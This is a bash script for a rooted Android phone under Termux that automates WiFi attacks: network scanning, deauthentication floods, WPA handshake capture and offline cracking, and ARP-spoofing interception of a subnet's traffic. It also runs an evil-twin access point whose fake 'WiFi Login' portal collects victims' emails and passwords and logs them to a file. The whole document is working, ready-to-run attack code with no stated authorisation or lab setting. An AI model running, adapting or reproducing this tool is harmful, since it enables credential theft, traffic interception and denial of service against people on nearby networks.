#!/data/data/com.termux/files/usr/bin/bash
# ============================================================================
#  FLLC - S20+ WiFi Attack Automation
# ============================================================================
#  Requires: Magisk root, monitor mode capable WiFi (or external adapter)
#  Tools: aircrack-ng suite, nmap, tcpdump
#
#  Usage:
#    ./wifi_attacks.sh scan              # Scan for targets
#    ./wifi_attacks.sh deauth <BSSID>    # Deauth attack
#    ./wifi_attacks.sh handshake <BSSID> # Capture WPA handshake
#    ./wifi_attacks.sh evil_twin <SSID>  # Evil twin AP
#    ./wifi_attacks.sh crack <file>      # Crack captured handshake
#    ./wifi_attacks.sh mitm              # ARP spoofing MITM
# ============================================================================

OUTPUT_DIR="/sdcard/wifi_attacks_$(date +%Y%m%d)"
mkdir -p "$OUTPUT_DIR"
IFACE="wlan0"
MON_IFACE="wlan0mon"

red='\033[0;31m'
green='\033[0;32m'
yellow='\033[1;33m'
blue='\033[0;34m'
nc='\033[0m'

banner() {
    echo -e "${blue}"
    echo "============================================"
    echo "  FLLC - WiFi Attack Suite"
    echo "  S20+ Headless Platform"
    echo "============================================"
    echo -e "${nc}"
}

check_root() {
    if [ "$(id -u)" != "0" ]; then
        echo -e "${yellow}[!] Escalating to root...${nc}"
        exec su -c "$0 $@"
    fi
}

enable_monitor() {
    echo -e "${yellow}[*] Enabling monitor mode on $IFACE...${nc}"
    airmon-ng check kill 2>/dev/null
    airmon-ng start "$IFACE" 2>/dev/null

    # Check if monitor interface was created
    if iwconfig "$MON_IFACE" 2>/dev/null | grep -q "Monitor"; then
        echo -e "${green}[+] Monitor mode enabled: $MON_IFACE${nc}"
        return 0
    else
        # Try alternative method
        ip link set "$IFACE" down
        iw dev "$IFACE" set type monitor
        ip link set "$IFACE" up
        MON_IFACE="$IFACE"
        echo -e "${yellow}[*] Using $IFACE in monitor mode${nc}"
        return 0
    fi
}

disable_monitor() {
    echo -e "${yellow}[*] Disabling monitor mode...${nc}"
    airmon-ng stop "$MON_IFACE" 2>/dev/null
    ip link set "$IFACE" down 2>/dev/null
    iw dev "$IFACE" set type managed 2>/dev/null
    ip link set "$IFACE" up 2>/dev/null
    # Restart networking
    svc wifi enable 2>/dev/null
}

# ============================================================================
#  SCAN: Discover all WiFi networks and clients
# ============================================================================
cmd_scan() {
    banner
    echo -e "${green}[SCAN] Starting WiFi discovery...${nc}"
    check_root
    enable_monitor

    echo -e "${yellow}[*] Scanning for 30 seconds (Ctrl+C to stop early)...${nc}"
    timeout 30 airodump-ng "$MON_IFACE" -w "$OUTPUT_DIR/scan" --output-format csv,pcap 2>/dev/null

    # Parse results
    if [ -f "$OUTPUT_DIR/scan-01.csv" ]; then
        echo -e "\n${green}=== DISCOVERED NETWORKS ===${nc}"
        head -50 "$OUTPUT_DIR/scan-01.csv"
        echo -e "\n${green}[+] Full results saved to $OUTPUT_DIR/scan-01.csv${nc}"
    fi

    disable_monitor
}

# ============================================================================
#  DEAUTH: Disconnect clients from target AP
# ============================================================================
cmd_deauth() {
    local target_bssid="$1"
    local target_client="${2:-FF:FF:FF:FF:FF:FF}"
    local count="${3:-100}"

    if [ -z "$target_bssid" ]; then
        echo -e "${red}[!] Usage: $0 deauth <BSSID> [client_MAC] [count]${nc}"
        exit 1
    fi

    banner
    echo -e "${red}[DEAUTH] Target: $target_bssid${nc}"
    echo -e "${red}[DEAUTH] Client: $target_client${nc}"
    echo -e "${red}[DEAUTH] Frames: $count${nc}"
    check_root
    enable_monitor

    aireplay-ng --deauth "$count" \
        -a "$target_bssid" \
        -c "$target_client" \
        "$MON_IFACE" 2>/dev/null

    echo -e "${green}[+] Deauth complete${nc}"
    disable_monitor
}

# ============================================================================
#  HANDSHAKE: Capture WPA 4-way handshake
# ============================================================================
cmd_handshake() {
    local target_bssid="$1"
    local channel="${2:-0}"

    if [ -z "$target_bssid" ]; then
        echo -e "${red}[!] Usage: $0 handshake <BSSID> [channel]${nc}"
        exit 1
    fi

    banner
    echo -e "${yellow}[HANDSHAKE] Targeting: $target_bssid on CH $channel${nc}"
    check_root
    enable_monitor

    # Start capture in background
    echo -e "${yellow}[*] Capturing... (will deauth to force reconnection)${nc}"
    airodump-ng --bssid "$target_bssid" \
        -c "$channel" \
        -w "$OUTPUT_DIR/handshake_${target_bssid//:/}" \
        "$MON_IFACE" &
    DUMP_PID=$!

    sleep 5

    # Send deauth to force handshake
    aireplay-ng --deauth 10 \
        -a "$target_bssid" \
        "$MON_IFACE" 2>/dev/null &

    # Wait for handshake (up to 60 seconds)
    echo -e "${yellow}[*] Waiting for handshake (60s timeout)...${nc}"
    for i in $(seq 1 60); do
        if aircrack-ng "$OUTPUT_DIR/handshake_${target_bssid//:/}-01.cap" 2>/dev/null | grep -q "1 handshake"; then
            echo -e "${green}[+] HANDSHAKE CAPTURED!${nc}"
            break
        fi
        sleep 1
    done

    kill $DUMP_PID 2>/dev/null

    # Verify
    if [ -f "$OUTPUT_DIR/handshake_${target_bssid//:/}-01.cap" ]; then
        echo -e "${green}[+] Saved to: $OUTPUT_DIR/handshake_${target_bssid//:/}-01.cap${nc}"
        echo -e "${green}[+] Convert for hashcat: cap2hccapx handshake.cap handshake.hccapx${nc}"
    fi

    disable_monitor
}

# ============================================================================
#  EVIL TWIN: Rogue AP with captive portal
# ============================================================================
cmd_evil_twin() {
    local target_ssid="$1"
    local channel="${2:-6}"

    if [ -z "$target_ssid" ]; then
        echo -e "${red}[!] Usage: $0 evil_twin <SSID> [channel]${nc}"
        exit 1
    fi

    banner
    echo -e "${red}[EVIL TWIN] Cloning: $target_ssid on CH $channel${nc}"
    check_root

    # Create hostapd config
    cat > /tmp/hostapd.conf << HAPD
interface=$IFACE
driver=nl80211
ssid=$target_ssid
channel=$channel
hw_mode=g
HAPD

    # Create dnsmasq config
    cat > /tmp/dnsmasq.conf << DNS
interface=$IFACE
dhcp-range=192.168.4.10,192.168.4.250,12h
address=/#/192.168.4.1
DNS

    # Set up interface
    ip addr flush dev "$IFACE"
    ip addr add 192.168.4.1/24 dev "$IFACE"
    ip link set "$IFACE" up

    # Start services
    dnsmasq -C /tmp/dnsmasq.conf &
    DNSMASQ_PID=$!

    hostapd /tmp/hostapd.conf &
    HOSTAPD_PID=$!

    # Start simple HTTP server with captive portal
    mkdir -p /tmp/portal
    cat > /tmp/portal/index.html << 'PORTAL'
<!DOCTYPE html>
<html>
<head><title>WiFi Login</title>
<style>body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;background:#1a1a2e;margin:0}
.box{background:white;padding:40px;border-radius:16px;width:350px;box-shadow:0 20px 60px rgba(0,0,0,.3)}
h2{text-align:center;color:#333}input{width:100%;padding:12px;border:2px solid #ddd;border-radius:8px;margin:8px 0;box-sizing:border-box}
button{width:100%;padding:14px;background:#4A90D9;color:white;border:none;border-radius:8px;font-size:16px;cursor:pointer}</style></head>
<body><div class="box"><h2>WiFi Login Required</h2>
<form action="/login" method="POST">
<input name="email" placeholder="Email" required>
<input name="password" type="password" placeholder="Password" required>
<button>Connect</button></form></div></body></html>
PORTAL

    cd /tmp/portal
    python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
import json, datetime

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        with open('index.html', 'rb') as f:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(f.read())
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        data = parse_qs(self.rfile.read(length).decode())
        cred = {
            'time': str(datetime.datetime.now()),
            'email': data.get('email', [''])[0],
            'password': data.get('password', [''])[0],
            'client': self.client_address[0]
        }
        with open('$OUTPUT_DIR/evil_twin_creds.json', 'a') as f:
            f.write(json.dumps(cred) + '\n')
        print(f'[!!!] CRED: {cred[\"email\"]} : {cred[\"password\"]}')
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'<html><body><h2>Connected!</h2></body></html>')
    def log_message(self, *args): pass

HTTPServer(('0.0.0.0', 80), Handler).serve_forever()
" &
    HTTP_PID=$!

    echo -e "${green}[+] Evil Twin running. Press Ctrl+C to stop.${nc}"
    echo -e "${green}[+] Credentials will be saved to $OUTPUT_DIR/evil_twin_creds.json${nc}"

    # Wait for Ctrl+C
    trap "kill $DNSMASQ_PID $HOSTAPD_PID $HTTP_PID 2>/dev/null; disable_monitor; exit" INT
    wait
}

# ============================================================================
#  CRACK: Offline handshake cracking
# ============================================================================
cmd_crack() {
    local capfile="$1"
    local wordlist="${2:-/data/data/com.termux/files/usr/share/wordlists/rockyou.txt}"

    if [ -z "$capfile" ]; then
        echo -e "${red}[!] Usage: $0 crack <capture.cap> [wordlist]${nc}"
        exit 1
    fi

    banner
    echo -e "${yellow}[CRACK] Cracking: $capfile${nc}"
    echo -e "${yellow}[CRACK] Wordlist: $wordlist${nc}"

    # Try aircrack-ng first
    if command -v aircrack-ng &>/dev/null; then
        aircrack-ng "$capfile" -w "$wordlist" | tee "$OUTPUT_DIR/crack_result.txt"
    fi

    # Try hashcat if available
    if command -v hashcat &>/dev/null; then
        # Convert to hccapx
        local hccapx="${capfile%.cap}.hccapx"
        cap2hccapx "$capfile" "$hccapx" 2>/dev/null || true

        if [ -f "$hccapx" ]; then
            hashcat -m 22000 "$hccapx" "$wordlist" --force 2>/dev/null | tee -a "$OUTPUT_DIR/crack_result.txt"
        fi
    fi
}

# ============================================================================
#  MITM: ARP Spoofing Man-in-the-Middle
# ============================================================================
cmd_mitm() {
    banner
    echo -e "${red}[MITM] Starting ARP spoofing MITM attack...${nc}"
    check_root

    # Get gateway
    GATEWAY=$(ip route | grep default | awk '{print $3}' | head -1)
    echo -e "${yellow}[*] Gateway: $GATEWAY${nc}"

    # Enable IP forwarding
    echo 1 > /proc/sys/net/ipv4/ip_forward

    # Start tcpdump capture
    tcpdump -i "$IFACE" -w "$OUTPUT_DIR/mitm_capture.pcap" &
    TCPDUMP_PID=$!

    # ARP spoofing (if arpspoof available)
    if command -v arpspoof &>/dev/null; then
        echo -e "${red}[*] ARP spoofing the entire subnet...${nc}"
        arpspoof -i "$IFACE" -t "$GATEWAY" -r &
        ARP_PID=$!

        echo -e "${green}[+] MITM active. Traffic saved to $OUTPUT_DIR/mitm_capture.pcap${nc}"
        echo -e "${green}[+] Press Ctrl+C to stop${nc}"

        trap "kill $TCPDUMP_PID $ARP_PID 2>/dev/null; echo 0 > /proc/sys/net/ipv4/ip_forward; exit" INT
        wait
    else
        echo -e "${yellow}[!] arpspoof not available. Capturing traffic passively...${nc}"
        echo -e "${green}[+] Press Ctrl+C to stop${nc}"
        trap "kill $TCPDUMP_PID 2>/dev/null; exit" INT
        wait $TCPDUMP_PID
    fi
}

# ============================================================================
#  MAIN
# ============================================================================
banner

case "${1:-help}" in
    scan)       cmd_scan ;;
    deauth)     cmd_deauth "$2" "$3" "$4" ;;
    handshake)  cmd_handshake "$2" "$3" ;;
    evil_twin)  cmd_evil_twin "$2" "$3" ;;
    crack)      cmd_crack "$2" "$3" ;;
    mitm)       cmd_mitm ;;
    *)
        echo "Usage: $0 <command> [options]"
        echo ""
        echo "Commands:"
        echo "  scan                    - Discover WiFi networks"
        echo "  deauth <BSSID> [MAC]    - Deauth attack"
        echo "  handshake <BSSID> [CH]  - Capture WPA handshake"
        echo "  evil_twin <SSID> [CH]   - Rogue AP + captive portal"
        echo "  crack <file> [wordlist] - Crack handshake offline"
        echo "  mitm                    - ARP spoof MITM"
        ;;
esac
